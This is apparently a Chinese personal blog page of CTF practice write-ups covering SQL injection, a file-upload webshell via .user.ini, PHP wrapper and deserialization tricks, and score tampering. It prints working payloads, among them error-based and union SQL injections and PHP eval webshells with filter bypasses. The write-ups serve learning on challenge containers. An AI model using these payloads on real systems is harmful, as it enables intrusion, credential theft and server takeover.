<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="linbei">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-buuctf8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/17/buuctf8/" class="article-date">
  <time datetime="2021-07-17T06:11:11.000Z" itemprop="datePublished">2021-07-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/17/buuctf8/">buuctf8</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/17/buuctf8/" data-id="ckr7qs52y0000n8vudfey310o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-buuctf7" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/15/buuctf7/" class="article-date">
  <time datetime="2021-07-15T10:19:24.000Z" itemprop="datePublished">2021-07-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/15/buuctf7/">buuctf7</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>打开容器，发现这是一道sql注入题而且是之前的一道续题</p>
<h4 id="一-发现注入点："><a href="#一-发现注入点：" class="headerlink" title="一.发现注入点："></a>一.发现注入点：</h4><p>经过测试发现它存在注入点：<code>&#39;</code>，而且注入的位置是在密码栏<img src="/buuctf7.assets/image-20210718112626887.png" alt="image-20210718112626887"></p>
<p><img src="/buuctf7.assets/image-20210718112747724.png" alt="image-20210718112747724"></p>
<h4 id="二-探索注入方式："><a href="#二-探索注入方式：" class="headerlink" title="二.探索注入方式："></a>二.探索注入方式：</h4><p>进过初步的测试我发现过滤了很多关键词，包括：空格，union，and(&amp;)，or(|)等等</p>
<p>但是我这里发现它没有过滤**异或符(^)**，所以我们可以利用异或符做连接符，然后我们这边可以用括号代替空格（注意这里的替代不是完全替代的意思，我是怎么理解的：用括号把名词组括起来以代替空格，因此这题堆叠注入肯定用不了了，因为show和databases之间要用空格隔开。）所以思来想去可以用报错注入，这样也无需考虑异或判断语句成立的条件。</p>
<h4 id="三-报错注入开始："><a href="#三-报错注入开始：" class="headerlink" title="三.报错注入开始："></a>三.报错注入开始：</h4><h5 id="1-爆库"><a href="#1-爆库" class="headerlink" title="1.爆库"></a>1.爆库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,database()))#</span><br></pre></td></tr></table></figure>

<p><img src="/buuctf7.assets/image-20210718125452943.png" alt="image-20210718125452943"></p>
<h5 id="2-爆表"><a href="#2-爆表" class="headerlink" title="2.爆表"></a>2.爆表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))#</span><br></pre></td></tr></table></figure>

<p><img src="/buuctf7.assets/image-20210718125505104.png" alt="image-20210718125505104"></p>
<h5 id="3-爆列"><a href="#3-爆列" class="headerlink" title="3.爆列"></a>3.爆列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))#</span><br></pre></td></tr></table></figure>

<p><img src="/buuctf7.assets/image-20210718125606817.png" alt="image-20210718125606817"></p>
<h5 id="4-爆值"><a href="#4-爆值" class="headerlink" title="4.爆值"></a>4.爆值</h5><p>这边由于报错长度受限，我们可以猜测一下flag应该是在password里，节省一下回显长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))#</span><br></pre></td></tr></table></figure>

<p><img src="/buuctf7.assets/image-20210718130428916.png" alt="image-20210718130428916"></p>
<p>可以看到还差一点，我们可以试试用left()和right()去截</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))#</span><br></pre></td></tr></table></figure>

<p><img src="/buuctf7.assets/image-20210718130606174.png" alt="image-20210718130606174"></p>
<p>最后把flag拼接一下得：flag{0b94076f-db77-46e6-9ea3-34468bd544a0}</p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><h4 id="原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！"><a href="#原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！" class="headerlink" title="原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！"></a>原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</h4><p>打开容器，发现是一道sql注入题，按照惯例先看源码</p>
<h4 id="一-发现hint文件"><a href="#一-发现hint文件" class="headerlink" title="一.发现hint文件"></a>一.发现hint文件</h4><p>发现有一个search.php的文件：</p>
<p><img src="/buuctf7.assets/image-20210718173529948.png" alt="image-20210718173529948"></p>
<p>刚开始我还以为这是base64，结果解码完是乱码，搜索发现原来是base32。</p>
<p><strong>注意base32 和 base64 的区别：</strong><br>base32 只有大写字母和数字组成，或者后面有三个等号。<br>base64 只有大、小写字母和数字组成，后面一般是两个等号。</p>
<p>那么我们把这段话解码：<img src="/buuctf7.assets/image-20210718173904505.png" alt="image-20210718173904505"></p>
<p>得到一串base64编码串，再解码：<img src="/buuctf7.assets/image-20210718173944250.png" alt="image-20210718173944250"></p>
<p>发现就是一句普通的sql语句，注入点为<code>&#39;</code></p>
<h4 id="二-尝试注入"><a href="#二-尝试注入" class="headerlink" title="二.尝试注入"></a>二.尝试注入</h4><p>先试试最常用的union联合注入</p>
<p><code>username=0&#39; union select 1,2#</code></p>
<p><code>password=12</code></p>
<p><img src="/buuctf7.assets/image-20210718180607767.png" alt="image-20210718180607767"></p>
<p>字段数不一致，username改成<code>0&#39; union select 1,2,3#</code></p>
<p><img src="/buuctf7.assets/image-20210718180710189.png" alt="image-20210718180710189"></p>
<p>那么说明user表存在三个列，按照之前的经验就是：id，username，password</p>
<p>然后我想直接爆库：<code>0&#39; union select 1,2,databases#</code>但是这样会报错，我改成<code>0&#39; union select 1,2,database()#</code>发现它过滤了括号，然后我尝试了报错注入，堆叠注入都不行，然后我就有点懵了，看了wp才发现自己忘记了union联合注入的一个特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据作为单独一行数据值</strong></p>
<h5 id="举例说明："><a href="#举例说明：" class="headerlink" title="举例说明："></a>举例说明：</h5><p>假设原本user表中只存在一行数据</p>
<p><img src="/buuctf7.assets/image-20210718183332270.png" alt="image-20210718183332270"></p>
<p>我们输入查询语句：<code>0&#39; union select 1,&#39;admin&#39;,md5(123)#</code> 后可以看到user表中多了一行</p>
<p><img src="/buuctf7.assets/image-20210718183759389.png" alt="image-20210718183759389"></p>
<p>这样一来我们就混淆了admin账号的密码。</p>
<p>这里还有一点要注意的数据库会先检测我们的username是否存在，然后判断你输入的密码的md5编码和对应用户名的password是否一样。</p>
<p>因此我们要找一个存在的用户名。</p>
<p>一般来说数据库中都会有admin这个账号，那我们就来测试一下是否存在：<code>0&#39; union select &#39;admin&#39;,2,3#</code></p>
<p><img src="/buuctf7.assets/image-20210718202910736.png" alt="image-20210718202910736"></p>
<p>说明要么不在这一列，要么不存在，换一列试试：<code>0&#39; union select 1,&#39;admin&#39;,3#</code></p>
<p><img src="/buuctf7.assets/image-20210718203220570.png" alt="image-20210718203220570"></p>
<p>可以看到账号admin是存在的。那么下面我们就可以正式开始我们的联合注入了</p>
<h4 id="三-开始注入："><a href="#三-开始注入：" class="headerlink" title="三.开始注入："></a>三.开始注入：</h4><p>构造payload:</p>
<p>username=0’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#</p>
<p>password=123</p>
<p>注：<code>202cb962ac59075b964b07152d234b70</code>是123的MD5编码</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两道都是SQL注入的题，做下来感觉就是这种题找对注入的姿势很重要</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/15/buuctf7/" data-id="ckr4rheen0004bkvufv3h2ljy" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-buuctf6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/14/buuctf6/" class="article-date">
  <time datetime="2021-07-14T09:38:53.000Z" itemprop="datePublished">2021-07-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/14/buuctf6/">buuctf6</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>打开容器，发现是一道文件上传的题，那么根据我们的金典配方，第一步就是上传后缀为gif的木马webshell.gif：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后抓包改为php，</p>
<p><img src="/2021/07/14/buuctf6/image-20210717104127644.png" alt="image-20210717104127644">无效后缀，说明服务器端也检测了文件后缀，然后我接着试了phtml，php3等变形后缀都不能绕过，而且他这里都不能上传的原因都是后缀不合法，我就有点难受了，看了wp发现之前upload-lab刷的关于<code>.user.ini</code>的内容都忘光了。</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p><code>php.ini</code>是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p>
<p><img src="/2021/07/14/buuctf6/image-20210717105827172.png" alt="image-20210717105827172"></p>
<p>实际上，除了<code>PHP_INI_SYSTEM</code>和<code>PHP_INI_ALL</code>以外的模式都是可以通过.user.ini来设置的。</p>
<h5 id="下面这段话是关于PHP识别ini文件的规则："><a href="#下面这段话是关于PHP识别ini文件的规则：" class="headerlink" title="下面这段话是关于PHP识别ini文件的规则："></a>下面这段话是关于PHP识别ini文件的规则：</h5><p>PHP 除了扫描主 <code>php.ini</code> 之外，还会在每个目录下扫描 ini 文件，从被执行的 php 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 php 文件在 web 根目录之外，则只扫描该目录。</p>
<h6 id="我们这样理解这段话：当被执行的-php-文件在-web-根目录之外时，PHP先只会扫描-被执行php文件所在的目录下是否存在ini文件，如果存在的话-就会按照这个user-ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。"><a href="#我们这样理解这段话：当被执行的-php-文件在-web-根目录之外时，PHP先只会扫描-被执行php文件所在的目录下是否存在ini文件，如果存在的话-就会按照这个user-ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。" class="headerlink" title="我们这样理解这段话：当被执行的 php 文件在 web 根目录之外时，PHP先只会扫描 被执行php文件所在的目录下是否存在ini文件，如果存在的话 就会按照这个user.ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。"></a>我们这样理解这段话：当被执行的 php 文件在 web 根目录之外时，PHP先只会扫描 被执行php文件所在的目录下是否存在ini文件，如果存在的话 就会按照这个user.ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。</h6><h5 id="配置文件的利用："><a href="#配置文件的利用：" class="headerlink" title="配置文件的利用："></a>配置文件的利用：</h5><p><code>php.ini</code>中的配置项中很多敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。都是我们还是找到两个可以用来利用的配置项（下图的一和四）</p>
<p><img src="/2021/07/14/buuctf6/image-20210717110429438.png" alt="image-20210717110429438"></p>
<p><strong>auto_prepend_file：</strong>指定一个文件，自动包含在要执行的文件前，类似于在<strong>文件前</strong>调用了require()函数。</p>
<p><strong>auto_append_file：</strong>与<code>auto_prepend_file</code>配置项功能类似，只是在文件后面包含。 </p>
<p>使用方法很简单，直接写在.user.ini中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;webshell.gif</span><br></pre></td></tr></table></figure>



<p>因此懂得了<code>.user.ini</code>的利用，这题的思路就打开了，但是要注意的是利用的前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。因此我们先验证一下我们上传的文件夹内是否存在php文件，然后我上传了很多个文件</p>
<p><img src="/2021/07/14/buuctf6/image-20210717180500162.png" alt="image-20210717180500162"></p>
<p>发现上传的文件夹中存在index.php，那么我们就可以放心的利用啦</p>
<p>我们先上传一个我们的.user.ini  ，但是他这里存在文件头内容检查，因此我们加上gif文件头修饰：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;webshell.gif</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/2021/07/14/buuctf6/image-20210717175245869.png" alt="image-20210717175245869"></p>
<p>接着上传我们的一句话木马webshell.gif：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>发现它过滤了<code>&lt;?</code>，因此再对我们的一句话木马改写webshell2.gif：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;pass&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/2021/07/14/buuctf6/image-20210717175259925.png" alt="image-20210717175259925"></p>
<p>这边有一点要注意的是我把修改后的木马改名为了webshell2.gif，所以<code>.user.ini</code>内对应的文件名也要进行改写</p>
<p>全部上传成功以后，有两种方法可以获取flag。</p>
<p><strong>第一种</strong>用蚁剑连接，再打开虚拟终端，输入指令<code>cat /flag</code></p>
<p><img src="/2021/07/14/buuctf6/image-20210717181245508.png" alt="image-20210717181245508"></p>
<p><strong>sp：</strong>这边还有一点需要注意，服务器会定期删除上传的文件以确保服务器安全，所以我们要尽快连接蚁剑，完成操作。</p>
<p><strong>第二种</strong>就是直接传参，post我们写的一句话木马对应的变量，扫描根目录并以数组方式回显输出文件名<img src="/2021/07/14/buuctf6/image-20210717200923303.png" alt="image-20210717200923303"></p>
<p><img src="/2021/07/14/buuctf6/image-20210717201113683.png"></p>
<p>我们看到存在flag文件，尝试读取它：<img src="/2021/07/14/buuctf6/image-20210717201906697.png" alt="image-20210717201906697"></p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102688564">https://blog.csdn.net/weixin_44077544/article/details/102688564</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/113623796">https://blog.csdn.net/RABCDXB/article/details/113623796</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/14/buuctf6/" data-id="ckr4rhee50000bkvu5n29hfpu" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-攻防世界web进阶3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/" class="article-date">
  <time datetime="2021-07-13T02:46:25.000Z" itemprop="datePublished">2021-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/">攻防世界web进阶</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>打开容器，发现一段代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>我们可以看到我们上传三个参数，先看看他的判断语句：判断是否存在text变量，并以只读方式打开文件判断文件内容是否为<code>welcome to the zjctf</code>；接着判断上传的文件名是否有敏感词flag，若不存在则执行include函数；最后将上传的password的值反序列化并输出。</p>
<p>我们一步步来，先看第一步，我们可以看到很明显不存在text文件，那么我们是不是可以直接给text赋值<code>welcome to the zjctf</code>呢？但是试着直接赋值，发现没有回显，因此说明直接赋值肯定是不行的。我们尝试着使用http伪协议，试试能不能行。</p>
<p><strong>第一种php://input</strong></p>
<p>此协议需要 allow_url_include 为 on ，可以访问请求的原始数据的只读流, 将post请求中的数据作为 PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input ,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<br>这里用 <code>HackBar</code> 报错了<img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715165922619.png" alt="image-20210715165922619"></p>
<p>但是用bp抓包，再上传就看到有回显，说明这样子是可行的。</p>
<p><strong>第二种data://伪协议</strong></p>
<p>data://协议需要满足双on条件，作用和 php://input 类似</p>
<p>这里有一点需要注意的是，按照上述方法只读流时，要把php代码用base64编码后再上传，因为如果我们直接上传可能有些字符会被过滤。</p>
<p>因此第一步的payload：<code>?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p>再看第二步，我们注意到有include函数，那么可能就存在文件包含漏洞，用<code>php://filter</code>文件读取流，直接读取flag.php肯定是不行的了，因为第二个判断就要满足文件名中不包含flag字词。此处又提醒我们有一个useless文件，因此我们尝试读取该文件内容</p>
<p>第二步的payload：<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p><img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715165754328.png" alt="image-20210715165754328"></p>
<p>对回显的内容进行base64解码即可：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">php  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>代码审计发现包含文件中的变量file没有做任何防护措施，也就是说我们可以随意控制file的值。</p>
<p>附上exp：</p>
<p><img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715171559909.png" alt="image-20210715171559909"></p>
<p>代码执行完后会产生序列化字符串：<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>；</p>
<p>当我们把这串字符串作为参数password的值上传后，<code>unserialize</code>函数将其反序列化，这时结合<code>file_get_contents</code>函数打开flag.php文件，读取并输出回显。</p>
<p>因此这就构成了第三个payload：<code>?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>总结上述的三个payload，将他们合成一个：</p>
<p><code>?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p><img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715172620323.png" alt="image-20210715172620323"></p>
<p>F12查看源码获得flag：<img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715172736646.png" alt="image-20210715172736646"></p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>这是一道关于http伪协议、文件包含漏洞和反序列化的题目，只要懂得对应的点感觉还是比较容易的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/" data-id="ckr4rheef0001bkvud0sra7xz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-bugku3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/12/bugku3/" class="article-date">
  <time datetime="2021-07-12T10:33:50.000Z" itemprop="datePublished">2021-07-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/12/bugku3/">bugku3</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近看bugku新上了一波题，就做一下</p>
<h1 id="Game1"><a href="#Game1" class="headerlink" title="Game1"></a>Game1</h1><p>打开容器，发现是一个搭房子的小游戏，一般这种题都是靠修改得分来达到获取flag要求。</p>
<p>f12查看源码：</p>
<p><img src="/2021/07/12/bugku3/image-20210712195230060.png" alt="image-20210712195230060"></p>
<p>注意到一个提交文件，他包括了三个变量——score就是该局游戏得分，ip固定为ppp的值，sign为该局游戏得分经过base64编码后的值</p>
<p>因此我们可以构造payload：<code>score.php?score=6666&amp;ip=110.90.9.142&amp;sign=NjY2Ng==</code></p>
<p>但是这样回显是失败的，为什么会这样呢？试玩两局游戏<img src="/2021/07/12/bugku3/image-20210712195703946.png" alt="image-20210712195703946"></p>
<p>我们知道50的base64编码是NTA=，而这里看到他前面还多了前缀zM</p>
<p>多玩了几局后发现他真实的<code>sign=&#39;zM&#39;+&#39;Base64.encode(score.toString())&#39;+&#39;==&#39;</code></p>
<p>加上前缀后就成功得到flag啦</p>
<p><strong>sp：</strong>由于最近在学习python所以就学习大佬的脚本看看能不能跑出爆flag的临界点再哪：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:15342/score.php?score=&quot;</span></span><br><span class="line">url2=<span class="string">&quot;&amp;ip=110.90.9.142&amp;sign=zM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1000</span>,<span 